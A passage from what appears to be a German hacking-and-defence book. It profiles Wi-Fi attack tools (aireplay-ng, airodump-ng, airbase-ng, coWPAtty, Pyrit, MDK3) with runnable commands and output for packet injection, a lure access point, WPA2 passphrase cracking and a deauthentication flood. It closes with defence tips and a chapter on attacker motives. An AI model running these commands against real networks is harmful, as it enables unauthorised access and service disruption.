Ja\nSchnittstellen\nKnow-how\nCMD\nx\nAirodump-NG, Aircrack-NG\nAireplay-NG aus der Aircrack-NG-Suite dient der k\u00fcnstlichen Erzeugung massiven Verkehrs in einem Funknetzwerk. Mit Aireplay-NG werden durch verschiedene Angriffe verschl\u00fcsselte ARP-Requests abgefangen, um diese danach vervielfacht in das Funknetz einzuschleusen. Der durch Aireplay-NG generierte Netzwerktraffic l\u00e4sst sich durch Airodump-NG aufzeichnen und im Anschluss mit Aircrack-NG zur Bestimmung des verwendeten WEP/WPA-PSK/WPA2-Schl\u00fcssels verwenden. Aireplay-NG erfordert spezielle Chips\u00e4tze. So ben\u00f6tigt die WLAN-Karte beispielsweise unter Linux einen Chipsatz von Prism2, PrismGT, Atheros, Broadcom, Intel IWL, RTL8180, RTL8187, Ralink, ACX1xx oder Zydas, um mit Aireplay-NG zusammenarbeiten zu k\u00f6nnen. Windows wird zumindest nicht offiziell unterst\u00fctzt. Details dazu stehen auf der Website18 der Entwickler.\n18\nhttp://www.aircrack-ng.org/doku.php?id=install_drivers#windows\n10.4 Airodump-NG (Aircrack-NG-Suite)\n113\nDer Aufruf von Aireplay-NG, gestartet mit folgenden Parametern zur gezielten Injektion von Netzwerkverkehr: \u2022\n-3 (standard ARP-request replay)\n\u2022\n-b bssid (MAC address, Access Point)\n\u2022\nmon0 (replay interface)\nbringt folgendes Ergebnis: discordia:~# aireplay-ng -3 -b 00:22:6B:70:1E:FE mon0\nBild 10.3: Aireplay-NG generiert k\u00fcnstlichen Netzwerkverkehr\n10.4\nAirodump-NG (Aircrack-NG-Suite)\nAnbieter\nwww.aircrack-ng.org\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows, Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nWLAN-Traffic-Capturing-Tool Oberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nGUI\nNein / Schnittstellen Ja\nKnow-how\nCMD x Aircrack-NG\nAirodump-NG aus der Aircrack-NG-Suite zeichnet s\u00e4mtlichen Netzwerkverkehr auf, der auf einem zuvor festgelegten Interface empfangen wird, und speichert die Daten in eine Datei. Zus\u00e4tzlich lassen sich die zu jedem WEP-Paket geh\u00f6renden Initialisierungsvektoren (IVs) und die 4-Way-Handshakes bei WPA/WPA2 analysieren, die das Programm Aircrack-NG zur Bestimmung des verwendeten WEP/WPA/WPA2-Schl\u00fcssels\n114\nKapitel 10 \u2013 Wireless Hacking\nben\u00f6tigt. Befindet sich ein GPS-Empf\u00e4nger am Computer, zeichnet Airodump-NG zus\u00e4tzlich die Koordinaten entdeckter Access-Points auf. Der Aufruf von Airodump-NG, gestartet mit folgenden Parametern zur gezielten Aufzeichnung von Netzwerkpaketen: \u2022\nc (Capture on specific channels)\n\u2022\nbssid (Filter APs by BSSID)\n\u2022\nw (Dump file prefix)\n\u2022\nmon0 (Interface)\nbringt folgendes Ergebnis: discordia:~# airodump-ng -c 11 --bssid 00:22:6B:70:1E:FE -w spital.dump mon0\nBild 10.4: Airodump-NG beim Sammeln von Funknetz-Paketen auf Kanal 11\n10.5\nAirbase-NG (Aircrack-NG-Suite)\nAnbieter\nwww.aircrack-ng.org\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows, Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nMulti-Purpose WLAN-Tool\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Schnittstellen Ja\nUsability\nInstallation / Kompilation\nKnow-how\nCMD x Airmon-NG\n10.6 coWPAtty\n115\nAirbase-NG ist ein umfangreiches WLAN-Tool, entstammt der Aircrack-NG-Suite und bietet u. a. die M\u00f6glichkeit, einen eigenen Access-Point zu betreiben. Ein besonderes Schmankerl stellt die M\u00f6glichkeit dar, die ESSID anderer Access-Points zu \u00fcbernehmen, so dass ahnungslose WLAN-Clients magisch angezogen und anschlie\u00dfend attackiert werden k\u00f6nnen, z. B. \u00fcber die Hirte-19 oder Caffe Latte-Attack20. Der Aufruf von Airbase-NG, gestartet mit folgenden Parametern zum Aufbau eines softAP: \u2022\n-e (specify a single ESSID (default: default))\n\u2022\n-a (set Access Point MAC address)\n\u2022\n-c (sets the channel the AP is running on)\n\u2022\n-P (respond to all probes, even when specifying ESSIDs)\n\u2022\nmon0 (interface)\ngestaltet sich wie folgt:\nroot@discordia:~# airbase-ng -e \"INTERNET4FREE\" -a 00:1C:A4:A5:90:45 -c 9 P mon0 21:16:13 21:16:13 21:16:13 21:16:13\nCreated tap interface at0 Trying to set MTU on at0 to 1500 Trying to set MTU on mon0 to 1800 Access Point with BSSID 00:1C:A4:A5:90:45 started.\nBild 10.5: Airbase-NG beim WLAN-Management: Ein \u00bbHoneypot\u00ab wartet auf Opfer\n10.6\ncoWPAtty\nAnbieter\nhttp://wirelessdefence.org/ Preis Contents/coWPAttyMain.htm http://www.willhackforsushi.com/ Cowpatty.html\n-\nBetriebssystem(e)\nLinux/Unix, Windows\nSprachen\nEnglisch\nKategorie(n)\nWPA/WPA2-Password-Cracker\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nKnow-how\nCMD\nSchnittstellen Pyrit, genpmk, OpenSSL\n19\nhttp://www.aircrack-ng.org/doku.php?id=airbase-ng\n20\nhttp://www.airtightnetworks.com/home/resources/knowledge-center/caffe-latte.html\nx\n116\nKapitel 10 \u2013 Wireless Hacking\nBei coWPAtty handelt es sich um einen Password-Cracker f\u00fcr WPA/WPA2-Schl\u00fcssel, der sich neben klassischen Passwortlisten und W\u00f6rterb\u00fcchern auch mit Rainbow-Tables versehen l\u00e4sst. Die Erstellung der jeweiligen Rainbow-Table, die bei der sp\u00e4teren Errechnung f\u00fcr einen Quantensprung sorgt, erfolgt durch GENPMK. Eine W\u00f6rterbuch-Attacke, angesetzt auf ein WLAN-Dump-File mit den Parametern: \u2022\n-r (Packet capture file)\n\u2022\n-d (Hash file (genpmk))\n\u2022\n-s (Network SSID (enclose in quotes if SSID includes spaces))\nf\u00fchrt zu folgendem Ergebnis:\nroot@discordia:~# cowpatty -r berger_wpa.dump-01.cap -d /wordlists/all_rainbow.lst -s KANZLEI_BERGER cowpatty 4.6 \u2013 WPA-PSK dictionary attack.\n[[email protected]](/cdn-cgi/l/email-protection)\nCollected all necessary data to mount crack against WPA2/PSK passphrase. Starting dictionary attack. Please be patient. key no. 10000: Arbeitstakt key no. 20000: Bezugssystem (...) key no. 1140000: impulsar key no. 1150000: incornarsi The PSK is \"indubioproreo\". 1159422 passphrases tested in 11.28 seconds: root@discordia:~#\n102789.29 passphrases/second\nBild 10.6: coWPAtty beim Brechen eines WPA2-Schl\u00fcssels in Verbindung mit Rainbow-Tables\n10.7\nPyrit\nAnbieter\nhttp://code.google.com/p/pyrit http://pyrit.wordpress.com\nPreis\n-\nBetriebssystem(e) Linux, FreeBSD und Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nWPA/WPA2-Password-Cracker\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nNein / Ja\nKnow-how\nCMD\nSchnittstellen CUDA, OpenCL, ATI-Stream, VIA Padlock, coWPAtty\nx\n10.8 MDK3\n117\nBei Pyrit handelt es sich um einen leistungsf\u00e4higen Password-Cracker f\u00fcr WPA/WPA2Schl\u00fcssel. Pyrit integriert neben CPUs auch GPUs aktueller Grafikkarten (CUDA, ATIStream, OpenCL und VIA Padlock) und erreicht damit eine massive Beschleunigung der Rechenoperation. Eine W\u00f6rterbuch-Attacke, angesetzt auf ein WLAN-Dump-File mit den Parametern: \u2022\n-e (Filters AccessPoint by BSSID)\n\u2022\n-i (Filename for input ('-' is stdin))\n\u2022\n-r (Packet capture source in pcap-format)\nbringt folgendes Ergebnis: root@discordia:~# pyrit -e \"KANZLEI_BERGER\" -i /wordlists/all.lst -r berger_wpa.dump-01.cap attack_passthrough Pyrit 0.2.5-dev (C) 2008, 2009 Lukas Lueg http://pyrit.googlecode.com This code is distributed under the GNU General Public License v3 Connecting to storage... connected Parsing file '/berger_wpa.dump-01.cap' (1/1)... 2825 packets (2825 802.11-packets), 1 APs Picked AccessPoint 00:14:6c:1d:1c:c2 automatically... Tried 340006 PMKs so far; 862 PMKs per second. Computed 953.16 PMKs/s total. #1: 'CUDA-Device #1 'GeForce 9300 GS'': 454.4 PMKs/s (Occ. 99.5%; RTT 3.5) #2: 'CPU-Core (SSE2)': 505.0 PMKs/s (Occ. 99.2%; RTT 2.9) The password is 'indubioproreo'. root@discordia:~#\nBild 10.7: Pyrit beim Brechen eines WPA2-Schl\u00fcssels unter Einsatz der GPU\n10.8\nMDK3\nAnbieter\nhttp://homepages.tu-darmstadt. de/~p_larbig/wlan/#mdk3\nPreis\n-\nBetriebssystem(e)\nLinux/Unix, FreedBSD, Windows\nSprachen\nEnglisch\nKategorie(n)\nMulti-Purpose WLAN-Tool\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 10 MB\nNein / Ja\nUsability\nInstallation / Kompilation Know-how\nGUI\nSchnittstellen\nCMD\nx\n118\nKapitel 10 \u2013 Wireless Hacking\nMDK3 ist ein sehr vielf\u00e4ltiges Tool und bietet zahlreiche Funktionen wie beispielsweise ein Brute-Force von MAC-Filtern oder versteckter SSIDs, verschiedene Network-Probes, Authentication-DoS zur Blockade eines Access-Points, FakeAP zur Irritation von WLAN-Clients oder ein Deauthentication/Disassociation zur \u00dcberflutung der WLANSignale. Ein Deauthentication / Disassociation Amok Mode, der dazu f\u00fchrt, dass s\u00e4mtliche Teilnehmer aus dem WLAN geworfen, und die Kommunikation unmittelbar unterbunden wird, verl\u00e4uft durch die Parameter: \u2022\n-d (Deauthentication / Disassociation Amok Mode: Kicks everybody found from AP)\n\u2022\n-c (Set the channel where the fake network should be)\n\u2022\n-s (Set speed in frames per second (Default: 50))\nund f\u00fchrt zu folgendem Ergebnis:\nroot@discordia:~# mdk3 wlan0 d -c 4 -s 250 Disconnecting between: 00:21:5C:54:7D:CD and: 00:22:6B:70:1E:FE on channel: 4 Disconnecting between: 00:21:5C:54:7D:CD and: 00:22:6B:70:1E:FE on channel: 4 (...) Disconnecting between: 00:21:5C:54:7D:CD and: 00:22:6B:70:1E:FE on channel: 4 Packets sent: 1209 \u2013 Speed: 116 packets/sec^C root@discordia:~#\nBild 10.8: MDK3 beim Deauthentication / Disassociation Amok Mode\n10.9\nVistumbler\nAnbieter\nPreis\n-\nBetriebssystem(e) Windows Vista , Windows 7\nwww.vistumbler.net\nSprachen\nEnglisch\nKategorie(n)\nWLAN-Scanner\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 10 MB\nJa\nUsability\nInstallation\nKnow-how\nSchnittstellen\nx\nCMD\nGPS, Google Earth\nBei Vistumbler handelt es sich um einen WLAN-Scanner f\u00fcr Windows Vista und Windows 7, der zur Suche von Funknetzen eingesetzt wird. Aufgrund der detaillierten Informationen \u00fcber die gefundenen Access-Points sowie der einfachen Bedienung wird Vistumbler gerne beim Wardriving verwendet.\n10.9 Vistumbler\n119\nDie \u00fcber die Access-Points ermittelten Informationen erstrecken sich auf MAC-Adresse, Kanal, Netzwerkname (SSID), Netzwerktyp, Authentifizierung, Signalqualit\u00e4t und Verschl\u00fcsselungstyp. Unter Umst\u00e4nden kann das Programm auch den Hersteller des Access-Points identifizieren. Die Access-Points werden nach Kan\u00e4len, Netzwerknamen und Kriterien wie Verschl\u00fcsselung etc. sortiert. Die jeweilige Signal-Qualit\u00e4t wird durch Diagramme optisch dargestellt, auch die Ausgabe von Audio-Signalen ist m\u00f6glich. Vistumbler bietet Unterst\u00fctzung f\u00fcr GPS-Empf\u00e4nger, wodurch gefundene AccessPoints mit ihrer Position gespeichert und sowohl sp\u00e4ter als auch unmittelbar durch eine optionale Verzahnung mit Google Earth in Karten eingezeichnet werden k\u00f6nnen. Zahlreiche Export-Funktionen runden die vielf\u00e4ltigen M\u00f6glichkeiten der Kartographie sinnvoll ab. Im Gegensatz zu anderen bekannten WLAN-Scannern wie Kismet-Newcore scannt Vistumbler nicht passiv durch Abh\u00f6ren der Netzwerkpakete, sondern aktiv durch regelm\u00e4\u00dfiges Senden von sogenannten Probe-Request-Frames. Ist der Access-Point so konfiguriert, dass er auf diese Anfrage reagiert, kann Vistumbler ihn erkennen, andernfalls taucht der Access-Point nicht in der Liste auf.\nBild 10.9: Vistumbler bei der Suche nach Funknetzen \u2013 hier verzahnt mit Google Earth\n120\nKapitel 10 \u2013 Wireless Hacking\n10.10 Abwehr \u2013 generelle Tipps Die Abwehr potenzieller WLAN-Eindringlinge f\u00e4llt nicht weiter schwer, sofern die folgenden Punkte hinreichende Ber\u00fccksichtigung finden. So sollte im h\u00e4uslichen Umfeld ausschlie\u00dflich der \u2013 derzeit \u2013 als sicher geltende Sicherheitsstandard WPA2 zum Einsatz kommen und sowohl das Login des WLAN-Routers als auch der WPA2-Schl\u00fcssel mit einer komplexen Passphrase abgesichert sein (f\u00fcr den WPA2-Schl\u00fcssel beispielsweise 60 Zeichen, bestehend aus Gro\u00df- und Kleinbuchstaben, Zahlen und Sonderzeichen). Unternehmen legen sicherheitshalber unter die WPA2-Verschl\u00fcsselung zus\u00e4tzlich einen VPN-Layer (beispielsweise IPSec oder OpenVPN), um auch im Rahmen eines angemessenen Security Managements sowohl Investitions- als auch Planungssicherheit gew\u00e4hrleisten zu k\u00f6nnen. Und noch ein letzter Tipp: Schalten Sie das WLAN doch einfach aus, wenn Sie es nicht unbedingt ben\u00f6tigen \u2013 so sparen Sie Strom, verzichten auf die Extraportion Strahlung und k\u00f6nnen sich zugleich sicher sein, dass innerhalb der Off-Time kein Schindluder mit Ihrem WLAN getrieben werden kann. Zahlreiche WLAN-Router bieten die M\u00f6glichkeit zum zeitabh\u00e4ngigen WLAN-Shutdown, teilweise auch \u00fcber die Telefonanlage, notfalls hilft eine Zeitschaltuhr aus dem Baumarkt oder die manuelle Trennung des Netzteils vom Stromnetz.\n121\nTeil II: Angriffsszenarien und Abwehrmechanismen\n123\n11 Die Angreifer und ihre Motive 11.1\nDie Motive\nF\u00fcr Angriff wie Verteidigung gilt: Man muss genau wissen, was man und aus welchen Gr\u00fcnden man es tun will. Die Maxime lautet: Wer wei\u00df, was er tut, kann tun, was er will. Die meisten Angriffe lassen sich auf eines der folgenden Motive zur\u00fcckf\u00fchren.\n11.1.1 Rache Der Angreifer f\u00fchlt sich beleidigt, gar in seiner Ehre gekr\u00e4nkt: Das Opfer hat ihm \u2013 wenigstens aus seiner Sicht \u2013 etwas Bestimmtes angetan (z. B. ihn im Chatroom beleidigt, seine F\u00e4higkeiten in Frage gestellt, seinen Glauben geschm\u00e4ht etc.). Der Angreifer wird in der Folge bestrebt sein, dem anderen einen Schaden zuzuf\u00fcgen, der seiner eigenen Sch\u00e4digung ann\u00e4hernd vergleichbar ist. Es muss sich nicht um ein Script-Kiddie oder einen klassischen Hacker handeln. Aus Rachsucht in einem PC oder in ein Netzwerk einzubrechen, kann beispielsweise auch Sache eines technisch versierten Angestellten sein, dem man seiner Auffassung nach ungerechtfertigt gek\u00fcndigt hat. Ziel der Rachsucht ist meist das Au\u00dfergefechtsetzen von Rechnern oder Speichermedien. Dazu kann auch geh\u00f6ren, dass man dem Opfer einen Virus zukommen l\u00e4sst, der s\u00e4mtliche Daten seiner Festplatte zerst\u00f6rt. Bei milderen Varianten kann der Angreifer auch \u00bbnur\u00ab die Internetf\u00e4higkeiten seines Opfers zerst\u00f6ren. In eher seltenen F\u00e4llen wird nichts zerst\u00f6rt, sondern es werden Daten bzw. Informationen entwendet (z. B. Kreditkartendaten), um sie entweder an den Meistbietenden zu verscherbeln oder um sie dem Opfer zur\u00fcckzuverkaufen. Der Angriff muss nicht gezielt erfolgen, sondern kann auch anonyme Internet-/Anwendergruppen treffen. Der Angreifer wird in der Regel erst dann von seinem Opfer ablassen, wenn er mit dem erzielten Effekt zufrieden ist. Gezielter Angriff:\nSchadenswirkung:\nEingesetztes Know-how:\n11.1.2 Geltungssucht Der Angreifer m\u00f6chte sich beweisen, indem er der Szene, die dabei als Resonanzboden dient, seine zumeist destruktiven F\u00e4higkeiten demonstriert. Nehmen wir den geistigen Wurmsch\u00f6pfer von Netsky und Sasser, Sven J. Im Fr\u00fchjahr 2004 infizierte Sasser, der geschickt programmiert war und das System \u00fcber eine L\u00fccke im LSASS infizierte, in\n124\nKapitel 11 \u2013 Die Angreifer und ihre Motive\natemberaubendem Tempo Millionen ungepatchter PCs. Nach seinen eigenen Aussagen wollte Sven besonders sch\u00f6ne Programme schreiben und die vorhandenen Schutzeinrichtungen austricksen. Einen unsterblichen Platz in der Hall of Fame versprechen auch sensationell durchgef\u00fchrte Hacks, z. B. in Milit\u00e4rnetze. Der hinterlassene Schaden ist meist unspezifisch und nicht direkt beabsichtigt, aber selten unbetr\u00e4chtlich. Gezielter Angriff:\nSchadenswirkung:\nEingesetztes Know-how:\n11.1.3 Furcht Der Angreifer f\u00fcrchtet, dass bestimmte Dinge \u00fcber ihn aufgedeckt werden oder ihm in n\u00e4herer Zukunft unliebsame Konsequenzen bevorstehen k\u00f6nnten (z. B. Strafanzeige wegen nachgewiesener Unterschlagungen). Aus Furcht versucht er, die Spuren fr\u00fcherer illegaler oder illegitimer Aktivit\u00e4ten zu verwischen. Er bricht in den Firmenrechner ein und l\u00f6scht dort alle Daten, inklusive auf weiteren Festplatten abgelegte Backups, die belastendes Material enthalten k\u00f6nnten. Manchmal schie\u00dft er dabei \u00fcber das Ziel hinaus und hinterl\u00e4sst eine Wirkung \u00e4hnlich einer Streubombe. Die Raffinesse des Angreifers kann sehr gro\u00df sein (Computerexperte), es kann sich aber auch um eine ver\u00e4ngstigte Ehefrau handeln, die die Festplatte formatiert, um zu verhindern, dass ihr Partner vielleicht durch Zufall belastendes Material zutage f\u00f6rdert. Ein direktes finanzielles Interesse an der Sch\u00e4digung des Opfers besteht f\u00fcr gew\u00f6hnlich nicht, da sich der Angriff weniger gegen die Person des Opfers als vielmehr gegen ihre Infrastruktur richtet. Gezielter Angriff:\nSchadenswirkung:\nEingesetztes Know-how:\n11.1.4 Materielle Interessen Aus unserer Sicht ist dies das vorrangigste Motiv f\u00fcr Netzangriffe. Die Angreifer wollen aus ihren Netzwerkattacken (Einsatz von Ad- und Sypware, RATs, Keyloggern und Trojanern) einen direkten und pers\u00f6nlichen Nutzen ziehen, z. B. durch Verkauf der durch illegale Machenschaften erlangten Daten oder durch Vermieten von Bot-Netzen. Erpressungsversuche von gro\u00dfen Konzernen, z. B. durch angedrohte oder durchgef\u00fchrte DDoS-Attacken, geh\u00f6ren ebenfalls zum Repertoire der Angreifer. An der schieren Zerst\u00f6rung von Daten und/oder Rechnern haben sie in der Regel kein Interesse. Schaut man sich heute die Malware-Statistiken an, dann wird schnell klar, worum es geht: gezieltes Ausspionieren von wieder verwertbaren Userdaten (z. B. Kreditkartenoder e-Banking-Informationen) bzw. \u00bbZombisierung\u00ab von m\u00f6glichst vielen Rechnern durch breit gestreute Wurminfektionen. Die meisten Angreifer verf\u00fcgen hier \u00fcber betr\u00e4chtliches technisches Know-how. Nat\u00fcrlich ist auch damit zu rechnen, dass klassi-\n11.2 Die Angreifer\n125\nsche Hacker von kriminellen Banden rekrutiert und bezahlt werden, dann amalgamieren Neugierde und Profitsucht zu einer \u00e4u\u00dferst b\u00f6sartigen und kriminellen Angreifermentalit\u00e4t wie z. B. Spamversand oder Verbreitung illegaler Software. Gezielter Angriff:\nSchadenswirkung:\nEingesetztes Know-how:\n11.1.5 Neugierde Es ist ein beliebtes Motiv: Einfach mal sehen, wo der Nachbar mit seinem WLAN so surft oder welche E-Mails der Partner in der letzten Zeit geschrieben und verschickt hat. Auch im Firmenumfeld kann man sich nach Lust, Laune und Kenntnissen gut austoben, z. B. mit einer nicht autorisierten, aber daf\u00fcr exzessiven Dateirecherche im Firmennetzwerk. Meistens geht es nicht darum, jemanden zu sch\u00e4digen, eher kommt hier das Thema \u00bbMacht\u00ab ins Spiel: Wissen ist Macht \u2013 man macht es, weil man es kann. Gelegentlich werden auch moralische Motive vorgeschoben (in Hackerkreisen durchaus \u00fcblich), um das eigene Tun zu rechtfertigen, wie z. B. der Kampf gegen die Profitgier der Konzerne oder gegen die Informationszur\u00fcckhaltung von Beh\u00f6rden. Im Gegensatz zu den \u00bbb\u00f6sen\u00ab Black Hats versuchen die \u00bbguten\u00ab White Hats, Schaden wenigstens von Privatanwendern fernzuhalten. Lieschen M\u00fcller in den Ordner zu schauen, verschafft auch weniger intellektuelle Befriedigung als die Datenbanken und Netze von Konzernen zu infiltrieren. Werden entsprechende Aktivit\u00e4ten von technisch versierten Amateuren gestartet, sind sehr h\u00e4ufig keine finanziellen Sonderinteressen im Spiel. Gezielter Angriff:\nSchadenswirkung:\nEingesetztes Know-how:\nNat\u00fcrlich sind das nur grobe Ann\u00e4herungen, und Ausnahmen lassen sich sicherlich auch finden. Man denke nur an ein m\u00e4\u00dfig talentiertes Script-Kiddie, das sich aus Vorlagen einen Wurm zusammengebastelt hat und jetzt neugierig ist, ob der Wurm tut, was er tun soll. Das Motiv ist hier Neugierde, es gibt auch keinen gezielten Angriff auf ein Unternehmen oder eine Institution. Nichtsdestotrotz kann der Schaden durchaus gewaltig sein: Der Internettraffic ist beeintr\u00e4chtigt, Rechnernetze sind \u00fcberlastet und auf die betroffenen Administratoren wartet jede Menge Aufr\u00e4umarbeit. Der Schaden kann schnell in die Millionen gehen.\n11.2\nDie Angreifer\nAngriffe k\u00f6nnen zwar automatisiert werden, dahinter stehen aber immer Menschen \u2013 mit unterschiedlichen Motiven. Bei den potenziellen Angreifern fallen zwei Gruppen sofort ins Auge:\n126\nKapitel 11 \u2013 Die Angreifer und ihre Motive\n11.2.1 Hacker Ihr Selbstbild hat Stewart Brand 1984 auf folgende griffige Formel reduziert: \u00bbInformation wants to be free.\u00ab Die Motivation der Hacker ist Neugierde gepaart mit extrem gutem IT-Wissen, vor allem Betriebssystem-, Netzwerk- und Programmier-Know-how. In den meisten F\u00e4llen wird man Hackern in der IT-Branche begegnen. Der CCC (Chaos Computer Club) hat seine ethischen Grundlagen in den \u00bbHackerethics\u00ab21 einmal so formuliert: \u2022\nDer Zugang zu Computern und allem, was einem zeigen kann, wie diese Welt funktioniert, sollte unbegrenzt und vollst\u00e4ndig sein.\n\u2022\nAlle Informationen m\u00fcssen frei sein.\n\u2022\nMisstraue Autorit\u00e4ten \u2013 f\u00f6rdere Dezentralisierung.\n\u2022\nBeurteile einen Hacker nach dem, was er tut, und nicht nach \u00fcblichen Kriterien wie Aussehen, Alter, Rasse, Geschlecht oder gesellschaftlicher Stellung.\n\u2022\nMan kann mit einem Computer Kunst und Sch\u00f6nheit schaffen.\n\u2022\nComputer k\u00f6nnen dein Leben zum Besseren ver\u00e4ndern.\n\u2022\nM\u00fclle nicht in den Daten anderer Leute.\n\u2022\n\u00d6ffentliche Daten n\u00fctzen, private Daten sch\u00fctzen.\nMan muss hier allerdings beachten, dass es sich um eine Form der Selbststilisierung handelt, die dem tradierten Vorurteil \u00bbHacker sind Computerkriminelle\u00ab entgegen wirken soll, die aber letztlich in sich ambivalent ist. Denn wenn alle Informationen frei (verf\u00fcgbar) sein m\u00fcssen, w\u00e4re es gleicherma\u00dfen berechtigt, die Internetzensur (die in vielen L\u00e4ndern praktiziert wird) anzuprangern und zu sabotieren und in gesicherte Firmennetze einzudringen, um sein Informationsbed\u00fcrfnis zu stillen. Dass Hacker, die von den White Hats als Abtr\u00fcnnige bezeichnet werden, sich diese Informationen bzw. dieses Know-how auch versilbern lassen, wie der KGB-Hack22 1985 \u2013 1989 zeigt, verr\u00e4t das grunds\u00e4tzliche Dilemma zwischen White Hats (die guten Hacker) und Black Hats (die b\u00f6sen, destruktiven Hacker). Die Grenze zwischen beiden verl\u00e4uft hier sehr schwimmend. Sehr aufschlussreich in diesem Zusammenhang ist eine Geschichte, die sich im Mai 2006 zutrug. Es fing damit an, dass der Sicherheitsberater Eric McCarty ein Leck im System der Uni von South California entdeckt und bei SecurityFocus.com gemeldet hatte. Und es endete mit einer Strafanzeige, als besagter Sicherheitsberater einer Bank anbot, dieses Sicherheitsleck zu beheben \u2013 gegen Cash. Von dort ist es nur ein kleiner Schritt zum \u00bbKopflanger\u00ab von kriminellen Banden, die diese Sicherheitsl\u00fccken gewerbsm\u00e4\u00dfig ausnutzen. Man verstehe uns aber bitte nicht falsch. Hacker sind keineswegs per definitionem Computerkriminelle. Aber durch ihr Wissen, zumal wenn es von kriminellen Banden instrumentalisiert wird, und ihr Selbstverst\u00e4ndnis k\u00f6nnen sie schnell zu einem potenziellen Sicherheitsrisiko f\u00fcr das von ihnen hochgesch\u00e4tzte freie Internet werden. Wie so\n21\nwww.ccc.de/hackerethics\n22\nhttp://de.wikipedia.org/wiki/KGB-Hack\n11.2 Die Angreifer\n127\noft entscheiden Motivation und Vorsatz \u00fcber gut und b\u00f6se. Ethische Hacker, die sich einem Ehrenkodex verschrieben haben, k\u00f6nnten zwar aufgrund ihres Wissens Schaden verursachen, verteufeln dieses jedoch zutiefst. Im Internet l\u00e4sst sich diese Zweischneidigkeit sehr gut beobachten \u2013 Stichwort Exploits: Ein Exploit ist der mindestens theoretische Beweis, dass in einem Programm eine Sicherheitsl\u00fccke existiert. Wird dieser Beweis, z. B. der WMF-Exploit, programmtechnisch umgesetzt und ins Netz gestellt, kann ihn jeder, der \u00fcber ein Minimum an Systemverst\u00e4ndnis verf\u00fcgt, auf den Rest der Menschheit loslassen. Auf der anderen Seite \u2013 und das ist die schon zitierte Ambivalenz des Hackens \u2013 k\u00f6nnen dadurch Sicherheitspatches beschleunigt werden, da es mittels Exploits z. B. m\u00f6glich ist, auch dem lernresistentesten Entscheider zu beweisen, dass nun wirklich etwas getan werden muss.\n11.2.2 Script-Kiddies Oft die j\u00fcngere, unausgereifte Ausgabe der Hacker: talentiert, IT-Basis-Know-how, an schnellen Erfolgen und Publicity interessiert, wobei im Gro\u00dfen und Ganzen die Folgen ihrer Handlung oft au\u00dfen vor bleiben. Die Wikipedia formuliert es so: \u00bbIm Bereich der Computersicherheit steht der Begriff Script-Kiddie f\u00fcr eine Person, die kein Sicherheitsexperte ist, jedoch in einer meist unreifen Art vorgefertigte Programme benutzt, um Sicherheitsbarrieren zu \u00fcberwinden oder um Vandalismus zu betreiben. Im Gegensatz zu einem Hacker agiert ein Script-Kiddie ohne Kenntnis dar\u00fcber, wie die verwendete Schwachstelle funktioniert und wie sich neue Sicherheitsl\u00fccken aufsp\u00fcren lassen.\u00ab In seinem Trojan White Paper23 hat Aelphaeis Mangarae im Mai 2006 einige Interviews mit typischen Script-Kiddies und jungen Malware-Codern ver\u00f6ffentlicht. Wir zitieren nachfolgend einige Passagen aus dem Interview mit Caesar2k, dem damals 20-j\u00e4hrigen Sch\u00f6pfer des Nuclear Rat. Er lebt in Brasilien, hat einen Kurs in Psychologie belegt, ist arbeitslos und programmiert in C++ und Delphi: Where do you think the Trojan Scene is heading? It\u2019s getting repetitive, every day one kid decides to release a new recompile of his Latinus clone, or code his awesome new featured Trojan in VB, and it\u2019s \u00bbsaturating the scene\u00ab. But I think it\u2019s getting more serious, since a lot of people are getting to use the computer every day, and the Trojan is becoming more a remote tool than ever, to make your tasks easier and to be able to control a LAN for example. What new technologies do you think we will see in newer Trojans? Why do you code Trojans? Is it just a hobby? Yes, it\u2019s a very profitable hobby. But I code them because its fun, and when I\u2019m home, that can be more fun than playing games. And it makes you to think a lot, when you decide to try something new. It\u2019s good for your brain health. What features do you think we will be seeing in future Trojans? Hmm I don\u2019t know about the future Trojans, lately any script kid is able to get some open source code and release its yet another Latinus rip l33t Trojan. But from the serious coders that usually code stuff from scratch and such, the Trojans will get 23\nhttp://igniteds.net\n128\nKapitel 11 \u2013 Die Angreifer und ihre Motive\nmore serious as well, like kernel mode Trojans (like akcom and MrJinxy are doing). That\u2019s pretty much the highest level of what a Trojan could have. I\u2019m not much into detailing features, since there\u2019s not much that would have to be implemented, besides DDoS that every kiddie loves. Finally, do you care that your software may be used for malicious purposes? Not at all, its not my problem really. People can decide their behavior, evil or good, as they take the responsibility for their actions, I couldn\u2019t care less. An diesem Interview stechen die wichtigsten Punkte direkt ins Auge. Der 20-j\u00e4hrige ist, wie Psychologen sagen w\u00fcrden, intrinsisch motiviert; er betreibt das Programmieren mit Hingabe und Profession, sieht sich als \u00bbserious coder\u00ab (nicht als Script-Kiddie) und rechtfertigt sein Tun als seri\u00f6se Aufgabe, die Spa\u00df macht und mit der sich durchaus auch Geld verdienen l\u00e4sst. Dass sich mit RATs und Trojanern, die er programmiert, jede Menge Sch\u00e4den anrichten lassen, geht ihn im \u00dcbrigen nichts an, es sei nicht sein Problem. Opfer dieses Angreifertyps, der auf Breitenwirkung aus ist, sind meist Privatanwender, w\u00e4hrend Hacker mehr Firmen und Institutionen ins Visier nehmen \u2013 quasi in Arbeitsteilung. Beide Gruppen verkaufen, unbeschadet von ethischen \u00dcberlegungen, ihre Dienste auch gern an zahlungsf\u00e4hige Klienten aus dem kriminellen Umfeld, die die Malware nutzen, um sich gezielt finanzielle Vorteile zu erschleichen.\n11.2.3 IT-Professionals Nicht nur Hacker und Script-Kiddies, sondern auch Personen, die berufsm\u00e4\u00dfig mit ITSecurity, mit Netzen und Systemen zu tun haben, k\u00f6nnen aus verschiedensten Gr\u00fcnden zum Angreifer mutieren. Auf jeden Fall bringen sie die wichtigste Voraussetzung mit: neben dem Insiderwissen vor allem das Verst\u00e4ndnis von Netzen und Systemen, inklusive ihrer verwundbaren Stellen. Wenn sich jetzt noch das entsprechende Motiv 